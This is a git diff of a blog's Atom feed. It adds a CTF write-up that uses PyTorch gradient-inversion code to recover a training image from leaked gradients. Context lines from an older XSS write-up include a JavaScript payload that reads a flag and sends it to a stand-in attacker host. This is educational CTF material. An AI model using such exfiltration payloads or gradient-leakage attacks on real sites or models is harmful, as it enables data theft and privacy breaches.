@@ -1,4 +1,159 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2022-11-20T15:58:25+00:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">x86-64 Assembly Cheat Sheet</title><link href="https://www.cjxol.com/posts/x86-64-cheat-sheet/" rel="alternate" type="text/html" title="x86-64 Assembly Cheat Sheet" /><published>2022-10-19T00:00:00+01:00</published><updated>2022-10-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/x86-64-cheat-sheet</id><content type="html" xml:base="https://www.cjxol.com/posts/x86-64-cheat-sheet/"><![CDATA[<p>This is still being updated upon I find useful things.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2022-12-08T03:50:24+00:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">HTB University CTF 2022 Deaths Glance (Misc) Writeup</title><link href="https://www.cjxol.com/posts/htb-uni-ctf-2022-misc-writeup/" rel="alternate" type="text/html" title="HTB University CTF 2022 Deaths Glance (Misc) Writeup" /><published>2022-12-08T00:00:00+00:00</published><updated>2022-12-08T00:00:00+00:00</updated><id>https://www.cjxol.com/posts/htb-uni-ctf-2022-misc-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/htb-uni-ctf-2022-misc-writeup/"><![CDATA[<p>This is my writeup for the only Misc challenge “Deaths Glance” in <a href="https://ctf.hackthebox.com/event/details/htb-university-ctf-2022-supernatural-hacks-696">HTB University CTF 2022</a> (<a href="https://ctftime.org/event/1825">on CTFtime</a>).</p>
+
+<p>The challenge was initially labelled as “easy” at the beginning of the event, and was changed to “medium” after 2 hours into the CTF with no solves to this challenge. Our team was the 2nd solved and submitted flag to this challenge, about one or two hours after the challenge first been solved about 24 hours into the CTF. There were 6 solves to this challenge in the 54 hours CTF with 328 teams submitted at least one flag.</p>
+
+<h2 id="the-challenge">The Challenge</h2>
+
+<p>The challenge is given with the following description:</p>
+
+<blockquote>
+  <p>You find yourself in possession of an ancient forbidden spell. Rumors have it that by revealing the rune originated from the spell, the mystery behind how you perish will be unveiled.</p>
+</blockquote>
+
+<p>The challenge is also with a downloadable containing a <code class="highlighter-rouge">forbiden_spell.pt</code> file and a <code class="highlighter-rouge">challenge.py</code> file.</p>
+
+<p>The Python file contains a convolutional neural network implemented in PyTorch, with the weights initialisation using a fixed seed, and code in comments defining some <code class="highlighter-rouge">dummy_data_size</code>. The model is for classification with 100 output classes, and input is 1-channel (greyscale) 32x32 image.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">torch</span>
+<span class="kn">import</span> <span class="nn">torch.nn</span> <span class="k">as</span> <span class="n">nn</span>
+<span class="n">torch</span><span class="p">.</span><span class="n">manual_seed</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
+<span class="n">device</span> <span class="o">=</span> <span class="s">"cpu"</span>
+
+<span class="k">def</span> <span class="nf">weights_init</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s">"weight"</span><span class="p">):</span>
+        <span class="n">m</span><span class="p">.</span><span class="n">weight</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">uniform_</span><span class="p">(</span><span class="o">-</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s">"bias"</span><span class="p">):</span>
+        <span class="n">m</span><span class="p">.</span><span class="n">bias</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">uniform_</span><span class="p">(</span><span class="o">-</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">LeNet</span><span class="p">(</span><span class="n">nn</span><span class="p">.</span><span class="n">Module</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">(</span><span class="n">LeNet</span><span class="p">,</span> <span class="bp">self</span><span class="p">).</span><span class="n">__init__</span><span class="p">()</span>
+        <span class="n">act</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">Sigmoid</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">Sequential</span><span class="p">(</span>
+            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
+            <span class="n">act</span><span class="p">(),</span>
+            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
+            <span class="n">act</span><span class="p">(),</span>
+            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span>
+            <span class="n">act</span><span class="p">(),</span>
+            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span>
+            <span class="n">act</span><span class="p">(),</span>
+        <span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">fc</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">Sequential</span><span class="p">(</span>
+            <span class="n">nn</span><span class="p">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">768</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
+        <span class="p">)</span>
+        
+    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">body</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">view</span><span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">size</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">fc</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">out</span>
+    
+<span class="n">net</span> <span class="o">=</span> <span class="n">LeNet</span><span class="p">().</span><span class="n">to</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+<span class="n">net</span><span class="p">.</span><span class="nb">apply</span><span class="p">(</span><span class="n">weights_init</span><span class="p">)</span>
+<span class="n">criterion</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">CrossEntropyLoss</span><span class="p">()</span>
+
+<span class="s">"""
+forbidden_spell = torch.load('path to challenge file')
+dummy_data_size=torch.Size([1, 1, 32, 32])
+
+#code here 
+"""</span>
+</code></pre></div></div>
+
+<p>Load and inspecting <code class="highlighter-rouge">forbidden_spell.pt</code>, it contains a list of torch tensors, the shape of the data in the file matches with the model parameters of the model defined in <code class="highlighter-rouge">challenge.py</code> . Their shape can be printed out with <code class="highlighter-rouge">for s in forbidden_spell: print(s.shape)</code> and <code class="highlighter-rouge">for parameters in net.parameters(): print(parameters.shape)</code> respectively, and gives:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>torch.Size([12, 1, 5, 5])
+torch.Size([12])
+torch.Size([12, 12, 5, 5])
+torch.Size([12])
+torch.Size([12, 12, 5, 5])
+torch.Size([12])
+torch.Size([12, 12, 5, 5])
+torch.Size([12])
+torch.Size([100, 768])
+torch.Size([100])
+</code></pre></div></div>
+
+<p>The description of the challenge does not seem clear with meaningful information (which is even misleading to me, as it turns out the challenge is indeed to work backwards while the description says “the rune originated from the spell”). The data in the <code class="highlighter-rouge">pt</code> file matches the shape of the model parameters perfectly, maybe it is the model weights, or maybe it is something else? Does the manual seed matter or it’s just irrelevant?</p>
+
+<p>It seems I would either happen to know the attack or I have to do a lot of guessing work.</p>
+
+<h2 id="the-solve">The Solve</h2>
+
+<p>After some <a href="#other-irrelevant-path-we-went-down">trial and error, some guessing and research</a>, we found very interesting research <a class="citation" href="#zhu19deep">(Zhu et al., 2019)</a> and <a href="https://github.com/mit-han-lab/dlg">GitHub repository</a> with <a href="https://github.com/mit-han-lab/dlg/blob/master/models/vision.py#L15">model</a> very similar to the model used in the challenge.</p>
+
+<p>Both the research and the code demonstration shows the possibility to recover training data with just model and the gradients for the data. The idea is to train some dummy data and label to produce the gradients that match the given gradient using gradient descent methods.</p>
+
+<p>To this challenge, we realised instead of being the weights, the “forbidden spell” given in the <code class="highlighter-rouge">pt</code> file could be the gradient from the training data (which could a image lead to the flag), and the model should be initialised with the given random seed and initialisation functions. We modified the script <a href="https://github.com/mit-han-lab/dlg/blob/master/main.py"><code class="highlighter-rouge">main.py</code> in the GitHub repository</a> to solve the challenge (append to original <code class="highlighter-rouge">challenge.py</code>):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"""
+Need to include original challenge script here.
+Also initialising the model with the given random seed is very important!
+"""</span>
+
+<span class="kn">import</span> <span class="nn">torch.nn.functional</span> <span class="k">as</span> <span class="n">F</span>
+<span class="kn">from</span> <span class="nn">torchvision</span> <span class="kn">import</span> <span class="n">transforms</span>
+<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="n">plt</span>
+
+<span class="k">def</span> <span class="nf">cross_entropy_for_onehot</span><span class="p">(</span><span class="n">pred</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">torch</span><span class="p">.</span><span class="n">mean</span><span class="p">(</span><span class="n">torch</span><span class="p">.</span><span class="nb">sum</span><span class="p">(</span><span class="o">-</span> <span class="n">target</span> <span class="o">*</span> <span class="n">F</span><span class="p">.</span><span class="n">log_softmax</span><span class="p">(</span><span class="n">pred</span><span class="p">,</span> <span class="n">dim</span><span class="o">=-</span><span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">))</span>
+
+<span class="n">tt</span> <span class="o">=</span> <span class="n">transforms</span><span class="p">.</span><span class="n">ToPILImage</span><span class="p">()</span>
+
+<span class="c1"># Load the gradient
+</span><span class="n">original_dy_dx</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="s">'forbidden_spell.pt'</span><span class="p">)</span>
+<span class="n">original_dy_dx</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="n">original_dy_dx</span><span class="p">)</span>
+
+<span class="c1"># generate dummy data and label
+</span><span class="n">dummy_data</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">randn</span><span class="p">((</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">)).</span><span class="n">to</span><span class="p">(</span><span class="n">device</span><span class="p">).</span><span class="n">requires_grad_</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">dummy_label</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">randn</span><span class="p">((</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)).</span><span class="n">to</span><span class="p">(</span><span class="n">device</span><span class="p">).</span><span class="n">requires_grad_</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="n">optimizer</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">optim</span><span class="p">.</span><span class="n">LBFGS</span><span class="p">([</span><span class="n">dummy_data</span><span class="p">,</span> <span class="n">dummy_label</span><span class="p">])</span>
+<span class="n">criterion</span> <span class="o">=</span> <span class="n">cross_entropy_for_onehot</span>
+
+<span class="k">for</span> <span class="n">iters</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">closure</span><span class="p">():</span>
+        <span class="n">optimizer</span><span class="p">.</span><span class="n">zero_grad</span><span class="p">()</span>
+
+        <span class="n">dummy_pred</span> <span class="o">=</span> <span class="n">net</span><span class="p">(</span><span class="n">dummy_data</span><span class="p">)</span> 
+        <span class="n">dummy_onehot_label</span> <span class="o">=</span> <span class="n">F</span><span class="p">.</span><span class="n">softmax</span><span class="p">(</span><span class="n">dummy_label</span><span class="p">,</span> <span class="n">dim</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">dummy_loss</span> <span class="o">=</span> <span class="n">criterion</span><span class="p">(</span><span class="n">dummy_pred</span><span class="p">,</span> <span class="n">dummy_onehot_label</span><span class="p">)</span> 
+        <span class="n">dummy_dy_dx</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">autograd</span><span class="p">.</span><span class="n">grad</span><span class="p">(</span><span class="n">dummy_loss</span><span class="p">,</span> <span class="n">net</span><span class="p">.</span><span class="n">parameters</span><span class="p">(),</span> <span class="n">create_graph</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        
+        <span class="n">grad_diff</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">gx</span><span class="p">,</span> <span class="n">gy</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">dummy_dy_dx</span><span class="p">,</span> <span class="n">original_dy_dx</span><span class="p">):</span> 
+            <span class="n">grad_diff</span> <span class="o">+=</span> <span class="p">((</span><span class="n">gx</span> <span class="o">-</span> <span class="n">gy</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span><span class="p">).</span><span class="nb">sum</span><span class="p">()</span>
+        <span class="n">grad_diff</span><span class="p">.</span><span class="n">backward</span><span class="p">()</span>
+        
+        <span class="k">return</span> <span class="n">grad_diff</span>
+    
+    <span class="n">optimizer</span><span class="p">.</span><span class="n">step</span><span class="p">(</span><span class="n">closure</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">iters</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
+        <span class="n">current_loss</span> <span class="o">=</span> <span class="n">closure</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">iters</span><span class="p">,</span> <span class="s">"%.4f"</span> <span class="o">%</span> <span class="n">current_loss</span><span class="p">.</span><span class="n">item</span><span class="p">())</span>
+        <span class="n">plt</span><span class="p">.</span><span class="n">imshow</span><span class="p">(</span><span class="n">tt</span><span class="p">(</span><span class="n">dummy_data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cpu</span><span class="p">()))</span>
+        <span class="c1"># plt.savefig(f'save/{iters}.png')
+</span>        <span class="c1"># torch.save(dummy_data[0].cpu(), f'save/{iters}.pt')
+</span></code></pre></div></div>
+
+<p>After about 20-30 iterations, we got a QR code that we could scan with many of the QR code scan apps on our phones.</p>
+
+<p><img src="/assets/image/htb-uni-ctf-2022-deaths-glance-recover-input.png" alt="QR code being recovered after about 20-30 iterations." /></p>
+
+<p>Scan the QR code, got the flag <code class="highlighter-rouge">HTB{d0nt_sh4r3_y0ur_fl4g}</code>.</p>
+
+<h2 id="other-irrelevant-path-we-went-down">Other (Irrelevant) Path We Went Down</h2>
+
+<p>Initially, we thought the given <code class="highlighter-rouge">pt</code> file is the weights of the model, and the challenge would be solved by somehow getting the input data. I came across a Misc challenge called “Battle in OrI/On” in <a href="https://www.hackthebox.com/events/cyber-apocalypse-2022">HTB Cyber Apocalypse CTF 2022</a>, which was to find the input of the neural net which gives the required output. For this challenge, we tried to train the input data for every of the 100 possible output classes (assuming the output would look like one-hot encoding). However, we did not see anything looks like the flag in the trained pattern.</p>
+
+<p>Looking at the patterns for each of the possible output classes, we noticed that class 55 outputs very different patterns to everything else, as well as the loss for that class is always 0 or near 0. We inspected the last tensor (we assumed it was the bias of the output layer) in the <code class="highlighter-rouge">pt</code> file, and noticed a large- close-to-1 value at index 55. I guessed that maybe class 55 is the output, but the input was not learning because of almost no loss due to the large bias, so I manually set the bias to a very negative value and train the input. However, we still did not get the flag.</p>
+
+<p>There were other things we tried, including to have random input or trained pattern from above as input and visualise each layer of the model output.</p>
+
+<h2 id="references">References</h2>
+
+<ol class="bibliography"><li><span id="zhu19deep">Zhu, L., Liu, Z., &amp; Han, S. (2019). Deep Leakage from Gradients. <i>Advances in Neural Information Processing Systems</i>.</span></li></ol>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><category term="ctf neural network" /><summary type="html"><![CDATA[This is my writeup for the only Misc challenge “Deaths Glance” in HTB University CTF 2022 (on CTFtime).]]></summary></entry><entry><title type="html">x86-64 Assembly Cheat Sheet</title><link href="https://www.cjxol.com/posts/x86-64-cheat-sheet/" rel="alternate" type="text/html" title="x86-64 Assembly Cheat Sheet" /><published>2022-10-19T00:00:00+01:00</published><updated>2022-10-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/x86-64-cheat-sheet</id><content type="html" xml:base="https://www.cjxol.com/posts/x86-64-cheat-sheet/"><![CDATA[<p>This is still being updated upon I find useful things.</p>
 
 <h2 id="registers">Registers</h2>
 
@@ -189,7 +344,7 @@
 
 <ul>
   <li><a href="https://ike.mahaloz.re/">`Ike: The Systems Hacking Handbook</a></li>
-</ul>]]></content><author><name></name></author><category term="cheat sheet" /><category term="assembly" /><summary type="html"><![CDATA[This is still being updated upon I find useful things.]]></summary></entry><entry><title type="html">LakeCTF Qualifications People (Web) Writeup</title><link href="https://www.cjxol.com/posts/lakectf-people-writeup/" rel="alternate" type="text/html" title="LakeCTF Qualifications People (Web) Writeup" /><published>2022-10-12T00:00:00+01:00</published><updated>2022-10-12T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/lakectf-people-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/lakectf-people-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
+</ul>]]></content><author><name></name></author><category term="cheat sheet" /><category term="assembly" /><summary type="html"><![CDATA[This is still being updated upon I find useful things.]]></summary></entry><entry><title type="html">LakeCTF Qualifications People (Web) Writeup</title><link href="https://www.cjxol.com/posts/lakectf-web-people-writeup/" rel="alternate" type="text/html" title="LakeCTF Qualifications People (Web) Writeup" /><published>2022-10-12T00:00:00+01:00</published><updated>2022-10-12T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/lakectf-web-people-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/lakectf-web-people-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
 
 <p>This is my writeup to web challenge “<a href="https://ctf.polygl0ts.ch/challenges#People-18">People</a>” in <a href="https://ctf.polygl0ts.ch/">LakeCTF</a> Qualifications round. LakeCTF is orgnised by EPFL’s CTF team <a href="https://polygl0ts.ch/">polygl0ts</a>. This challenge is solved by 36 teams out of 191 teams scored at least 1 point on the scoreboard. In this challenge I exploited XSS and improper configuration of CSP, more specifically omitting <code class="highlighter-rouge">base-uri</code>.</p>
 
@@ -235,7 +390,7 @@
 <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://web:8080/flag</span><span class="dl">"</span><span class="p">)</span>
     <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
     <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://my-server.example.com/xss?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">));</span>
-</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
+</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SekaiCTF 2022 Writeup</title><link href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" rel="alternate" type="text/html" title="SekaiCTF 2022 Writeup" /><published>2022-10-11T00:00:00+01:00</published><updated>2022-10-11T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/sekaictf-2022-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/sekaictf-2022-writeup/"><![CDATA[<p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
 
 <p>This is my writeup to web challenges “<a href="https://ctf.sekai.team/challenges#Bottle-Poem-29">Bottle Poem</a>”, “<a href="https://ctf.sekai.team/challenges#Issues-33">Issues</a>” and reverse challenge “<a href="https://ctf.sekai.team/challenges#Perfect-Match-X-treme-44">Perfect Match X-treme</a>” in <a href="https://ctf.sekai.team/">SekaiCTF 2022</a>. The official source code and solution provided by the challenge authors are here: <a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a>. I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.</p>
 
